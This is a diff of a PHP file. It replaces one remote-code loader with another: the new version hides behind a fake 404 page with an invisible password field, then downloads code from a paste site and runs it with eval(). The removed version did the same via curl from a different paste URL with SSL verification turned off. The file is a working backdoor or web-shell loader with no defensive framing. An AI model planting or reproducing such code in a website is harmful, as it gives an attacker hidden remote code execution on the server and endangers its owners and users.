@@ -1,20 +1,15 @@
 <?php
+session_start();
+$password = '9c983d1fc5500dce0b8f78e698372b8a';
 
-
-function getURL($url) {
-    
-    if(function_exists('curl_version')) {
-        
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
+if (!isset($_SESSION[md5($password)])) {
+    if(isset($_POST['password']) && !empty($_POST['password']) && md5($_POST['password']) == $password) {
+        $_SESSION[md5($password)] = true;
+    } else {
+        http_response_code(404);
+        echo '<form method="post" action=""><input type="password" style="border:none" name="password"></form>';
+        exit;
     }
 }
-
-
-eval("?>" . getURL("https://paste.ee/r/uRCs2erb/0"));
+$sa = file_get_contents('https://pastee.dev/r/uvZ2LqvN/0');
+eval('?>'.$sa);
